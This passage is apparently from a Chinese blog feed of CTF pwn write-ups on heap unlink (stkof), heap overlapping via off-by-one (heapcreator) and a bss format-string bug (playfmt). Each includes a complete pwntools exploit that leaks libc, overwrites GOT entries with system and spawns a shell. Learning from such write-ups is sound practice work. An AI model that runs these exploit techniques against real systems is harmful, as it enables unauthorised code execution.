class="hljs-number">0x602150</span>:<span class="hljs-number">0x0000000000602038</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602160</span>:<span class="hljs-number">0x00000000020f8530</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602170</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>可以看到chunk2的地址已被覆盖</p><h5 id="泄露基地址"><a href="#泄露基地址" class="headerlink" title="泄露基地址"></a>泄露基地址</h5><p>因为chunk已杯覆盖成0x602038</p><p>那么我们可以通过编辑函数进行操作</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-built_in">p64</span>(free_got)+<span class="hljs-built_in">p64</span>(puts_got)<br><span class="hljs-function"><span class="hljs-title">fill</span><span class="hljs-params">(<span class="hljs-number">2</span>,payload)</span></span><br></code></pre></td></tr></table></figure><p>把chunk1和chunk2的地址覆盖成free函数和puts函数</p><p><img src="/img/unlink/s.png" alt="img"></p><p>此时我们调用free(2)时便可泄露基地址</p><h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>接着我们使用编辑函数，把free函数got写成system</p><p><img src="/img/unlink/t.png" alt="img"></p><p><img src="/img/unlink/u.png" alt="img"></p><p><img src="/img/unlink/v.png" alt="img"></p><p>最后创建一个chunk存放&#x2F;bin&#x2F;sh后释放，getshell</p><p><img src="/img/unlink/w.png" alt="img"></p><h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br><span class="hljs-comment">#p=remote(&quot;node5.buuoj.cn&quot;,&#x27;28668&#x27;)</span><br>p=process(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.sendline(content)<br>    p.recvuntil(<span class="hljs-string">&quot;OK&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>alloc(<span class="hljs-number">0x30</span>)<br>alloc(<span class="hljs-number">0x30</span>)<br>alloc(<span class="hljs-number">0x80</span>)<br>alloc(<span class="hljs-number">0x30</span>)<br>fake=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x602138</span>)+p64(<span class="hljs-number">0x602140</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>fill(<span class="hljs-number">2</span>,fake)<br>free(<span class="hljs-number">3</span>)<br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_got)+p64(puts_got)<br>fill(<span class="hljs-number">2</span>,payload)<br>payload=p64(puts_plt)<br>fill(<span class="hljs-number">1</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>real=u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br>base=real-<span class="hljs-number">0x6f690</span><br>system=base+<span class="hljs-number">0x45390</span><br>fill(<span class="hljs-number">1</span>,p64(system))<br>fill(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br><br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889">好好说话之unlink</a></p><p><a href="https://blog.csdn.net/qq_43935969/article/details/115921797">hitcon2014_stkof详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用_overlapping</title>
      <link href="/2024/08/25/%E5%A0%86%E5%88%A9%E7%94%A8-overlapping/"/>
      <url>/2024/08/25/%E5%A0%86%E5%88%A9%E7%94%A8-overlapping/</url>
      
        <content type="html"><![CDATA[<h1 id="堆利用-overlapping"><a href="#堆利用-overlapping" class="headerlink" title="堆利用_overlapping"></a>堆利用_overlapping</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过修改chunk中的size的大小，从而让块向前或后延申，与后面的块造成重叠，来对extend的块的内容进行操作</p><p>例题：<a href="https://files.buuoj.cn/files/1f4895f785dd3e134c29823d904c9970/heapcreator">heapcreator</a></p><p><img src="/img/overlapping/a" alt="img"></p><p>这个程序有5个模块</p><h4 id="creat-heap模块"><a href="#creat-heap模块" class="headerlink" title="creat_heap模块"></a>creat_heap模块</h4><p><img src="/img/overlapping/b" alt="img"></p><p>这个模块是在heaparray+i处用malloc申请了一个堆块,并且是先构造了结构体再申请的</p><p><img src="/img/overlapping/c" alt="img"></p><p>大小存在heaparray+i</p><h4 id="edit-heap模块"><a href="#edit-heap模块" class="headerlink" title="edit_heap模块"></a>edit_heap模块</h4><p>这个模块可以对已创建的堆进行编辑</p><p><img src="/img/overlapping/e" alt="img"></p><p><img src="/img/overlapping/f" alt="img"></p><p>可以看到这里在修改内容的时候，输入的大小比创建时多了1，造成了off_by_one漏洞</p><h4 id="delete-heap模块"><a href="#delete-heap模块" class="headerlink" title="delete_heap模块"></a>delete_heap模块</h4><p><img src="/img/overlapping/g" alt="img"></p><p>这个模块比较的简单，输入index来删除对应的堆</p><p><img src="/img/overlapping/h" alt="img"></p><p>因为这个是先free内容部分，再free掉结构体，如果我们把free改成system,内容输入&#x2F;bin&#x2F;sh即可getshell</p><h4 id="show-heap模块"><a href="#show-heap模块" class="headerlink" title="show_heap模块"></a>show_heap模块</h4><p>这个模块为了打印堆的内容</p><p><img src="/img/overlapping/i" alt="img"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先我们先创建好第一个heap来部署&#x2F;bin&#x2F;sh,再运用off_by_one漏洞来造成overlapping</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>creat(<span class="hljs-number">24</span>,payload)<br>py2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>creat(<span class="hljs-number">16</span>,py2)<br>py3=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>py3=py3.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+<span class="hljs-string">&#x27;\x41&#x27;</span><br>edit(<span class="hljs-number">0</span>,py3)<br>delete(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/overlapping/j" alt="img"></p><p>如果进行off_by_one的话可以修改下一个heap结构体的大小，来对下一个heap的内容部分extend</p><p>然后我们释放掉再重启就可以对他的内容进行操作</p><p>先随便重启一个heap</p><p><img src="/img/overlapping/k" alt="img"></p><p>可以看到这个时候结构体是在内容的下面的</p><p>那么我们就可以把结构体的地址覆盖成free来泄露libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">creat(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(free) <span class="hljs-comment">#</span><br>printf(<span class="hljs-number">1</span>)<br>real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br>printf(<span class="hljs-number">1</span>)<br>base=real-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p><img src="/img/overlapping/l" alt="img"></p><p><img src="/img/overlapping/m" alt="img"></p><p><img src="/img/overlapping/n" alt="img"></p><p>我们的edit_heap模块也是根据结构体来定位从而修改内容大小</p><p>所以直接把内容修改为system即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/overlapping/o" alt="img"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#io=remote(&#x27;node5.buuoj.cn&#x27;,&#x27;27684&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>free=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">creat</span>(<span class="hljs-params">size,payload</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>io.sendline(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(index))<br>io.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>io.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#gdb.attach(io)</span><br>payload=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>creat(<span class="hljs-number">24</span>,payload)<br>py2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>creat(<span class="hljs-number">16</span>,py2)<br>py3=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>py3=py3.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+<span class="hljs-string">&#x27;\x41&#x27;</span><br>edit(<span class="hljs-number">0</span>,py3)<br>delete(<span class="hljs-number">1</span>)<br>creat(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> +p64(<span class="hljs-number">0x30</span>) +  p64(free)) <span class="hljs-comment">#</span><br>printf(<span class="hljs-number">1</span>)<br>real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br>printf(<span class="hljs-number">1</span>)<br>base=real-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br>io.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非栈上的格式化字符串漏洞_bss段</title>
      <link href="/2024/08/24/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/08/24/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="非栈上的格式化字符串漏洞-bss段"><a href="#非栈上的格式化字符串漏洞-bss段" class="headerlink" title="非栈上的格式化字符串漏洞-bss段"></a>非栈上的格式化字符串漏洞-bss段</h1><h4 id="方法一：修改printf为system，输入-bin-sh"><a href="#方法一：修改printf为system，输入-bin-sh" class="headerlink" title="方法一：修改printf为system，输入&#x2F;bin&#x2F;sh"></a>方法一：修改printf为system，输入&#x2F;bin&#x2F;sh</h4><p>这种方法会有点复杂</p><p>以buu上的hitcontraining_playfmt为例</p><p><img src="/img/fmt_bss/a.png" alt="img"></p><p><img src="/img/fmt_bss/b.png" alt="img"></p><p>没有开FULL RELRO，也就是说got表可改，那么我们的思路就是把printf的got表改成system,输入&#x2F;bin&#x2F;sh即可拿到shell</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-comment">#r = remote(&quot;node5.buuoj.cn&quot;, 28773)</span><br>r = process(<span class="hljs-string">&quot;./playfmt&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./playfmt&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>printf_got = <span class="hljs-number">0x0804A010</span><br>old_addr = <span class="hljs-number">0x0804B080</span><br><span class="hljs-comment"># printf:0xf7d7b2d0 system:0xf7d67200</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;if DEBUG:</span><br><span class="hljs-string">    gdb.attach(r, </span><br><span class="hljs-string">    </span><br><span class="hljs-string">    b *0x0804854F</span><br><span class="hljs-string">    c</span><br><span class="hljs-string">    )&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">&quot;=====================\n&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;=====================\n&quot;</span>) <span class="hljs-comment">#6 rbp 9 GOT 10 6-&gt;10</span><br>payload = <span class="hljs-string">&quot;%6$p\n%15$p&quot;</span><br>r.sendline(payload)<br>rbp = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(), <span class="hljs-number">16</span>) <span class="hljs-comment">#泄露栈地址</span><br>success(<span class="hljs-string">&quot;rbp:&quot;</span>+<span class="hljs-built_in">hex</span>(rbp))<br>start_main = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(), <span class="hljs-number">16</span>) - <span class="hljs-number">247</span> <span class="hljs-comment">#泄露libc地址</span><br>libc.address = start_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>raw_input()  <span class="hljs-comment">#</span><br>got_addr = rbp - <span class="hljs-number">4</span><br>num = got_addr &amp; <span class="hljs-number">0xFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%6$hhn&#x27;</span> <span class="hljs-comment">#把libc地址抓入栈</span><br>r.sendline(payload)<br><br>raw_input()<br>num = (printf_got)&amp; <span class="hljs-number">0xFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%10$hhn&#x27;</span> <span class="hljs-comment">#把printf_got抓入栈</span><br>r.sendline(payload)<br><br>raw_input()<br>got_addr = rbp - <span class="hljs-number">8</span> - <span class="hljs-number">4</span><br>num = got_addr&amp;<span class="hljs-number">0xFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%6$hhn&#x27;</span><br>r.sendline(payload)<br><br>raw_input()<br>num = (printf_got+<span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xFFFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%10$hn&#x27;</span>  <span class="hljs-comment">#把printf_got+2抓入栈</span><br>r.sendline(payload) <br><br>raw_input()<br>num1 = system&amp;<span class="hljs-number">0xFFFF</span>   <span class="hljs-comment">#0x5678</span><br>num2 = (system&gt;&gt;<span class="hljs-number">16</span>)-num1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num1), <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-built_in">hex</span>(num2))<br>payload =<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num1) + <span class="hljs-string">&#x27;c%9$hn%&#x27;</span> + <span class="hljs-built_in">str</span>(num2) + <span class="hljs-string">&#x27;c%7$hn&#x27;</span>  <span class="hljs-comment">#把printf_got改为system</span><br>r.sendline(payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;raw_input()</span><br><span class="hljs-string"></span><br><span class="hljs-string">payload=&#x27;%&#x27; + str(num2) + &#x27;c%7$hn&#x27;</span><br><span class="hljs-string">r.sendline(payload)&#x27;&#x27;&#x27;</span><br><br>raw_input()<br>payload = <span class="hljs-string">&quot;/bin/sh&quot;</span><br>r.sendline(payload)<br><br>r.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><p> 把libc地址抓进栈中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_input()  <span class="hljs-comment">#</span><br>got_addr = rbp - <span class="hljs-number">4</span><br>num = got_addr &amp; <span class="hljs-number">0xFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%6$hhn&#x27;</span> <span class="hljs-comment">#把libc地址抓入栈</span><br>r.sendline(payload)<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="/img/fmt_bss/c.png" alt="img"></p><p><img src="/img/fmt_bss/d.png" alt="img"></p><p> 因为libc的地址只有低8位不同，通过写入低字节把printf_got抓到栈中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_input()<br>num = (printf_got)&amp; <span class="hljs-number">0xFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%10$hhn&#x27;</span> <span class="hljs-comment">#把printf_got抓入栈</span><br>r.sendline(payload)<br></code></pre></td></tr></table></figure><p><img src="/img/fmt_bss/e.png" alt="img"></p><p>把print_got+2抓入栈中(把print_got改成system要一半一半的改）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_input()<br>num = (printf_got+<span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xFFFF</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%10$hn&#x27;</span>  <span class="hljs-comment">#把printf_got+2抓入栈</span><br>r.sendline(payload) <br></code></pre></td></tr></table></figure><p><img src="/img/fmt_bss/f.png" alt="img"></p><p> 把printf_got改成system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_input()<br>num1 = system&amp;<span class="hljs-number">0xFFFF</span>   <span class="hljs-comment">#0x5678</span><br>num2 = (system&gt;&gt;<span class="hljs-number">16</span>)-num1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num1), <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-built_in">hex</span>(num2))<br>payload =<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num1) + <span class="hljs-string">&#x27;c%9$hn%&#x27;</span> + <span class="hljs-built_in">str</span>(num2) + <span class="hljs-string">&#x27;c%7$hn&#x27;</span>  <span class="hljs-comment">#把printf_got改为system</span><br>r.sendline(payload)<br></code></pre></td></tr></table></figure><p><img src="/img/fmt_bss/g.png" alt="img"></p><p> 这里num2为什么要减去num1,且看AI怎么说:</p><p><code>num2</code> 是计算用来进行格式字符串漏洞利用时的一个重要部分。具体来说，<code>num2 = (system &gt;&gt; 16) - num1</code> 旨在算出在利用 <code>printf</code> 的格式字符串时需要写入的第二个16位数。</p><p>让我们逐步分析代码中为什么会有这样的操作：</p><ol><li><p><strong>狙击的目标：</strong> 该代码段的目标是将 <code>system</code> 的地址写入到某个特定的内存位置（例如 GOT 中的某个函数地址），使得在后续调用该函数时能够执行 <code>system(&quot;/bin/sh&quot;)</code>，从而获得一个 shell。</p></li><li><p><strong>16位数分解：</strong> 在 x86 系统中，指针通常是 32 位的。如果我们想把一个 32 位的地址（例如 <code>system</code> 的地址）分成两个部分，即高 16 位和低 16 位：</p><ul><li><code>num1</code> 是 <code>system</code> 地址的低 16 位（通过 <code>num = system &amp; 0xFFFF</code> 获取）。</li><li><code>num2</code> 是 <code>system</code> 地址的高 16 位（通过 <code>(system &gt;&gt; 16) - num1</code> 计算得到）。</li></ul><p>这里的操作 <code>(system &gt;&gt; 16)</code> 将地址右移 16 位，从而取出高 16 位。然后通过减去 <code>num1</code>，我们得到需要加到低 16 